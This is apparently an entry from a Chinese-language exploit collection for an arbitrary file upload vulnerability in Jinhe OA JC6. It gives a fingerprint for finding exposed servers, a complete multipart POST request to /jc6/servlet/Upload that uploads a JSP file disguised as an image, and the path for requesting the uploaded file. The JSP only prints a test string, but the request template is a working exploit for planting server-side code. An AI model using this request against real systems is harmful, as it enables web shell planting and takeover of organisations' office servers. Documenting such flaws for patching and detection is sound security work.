# 金和OAJC6Upload任意文件上传漏洞

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/ HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 169`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="img"; filename="1.jsp"
Content-Type: image/jpeg
<% out.println("hello"); %>
--00content0boundary00--

上传文件位置
GET /jc6/upload/402882838d63f2dd018d77bce0766e8f.jsp HTTP/1.1
Host:
```

**其他**
- 金和OA JC6 Upload任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA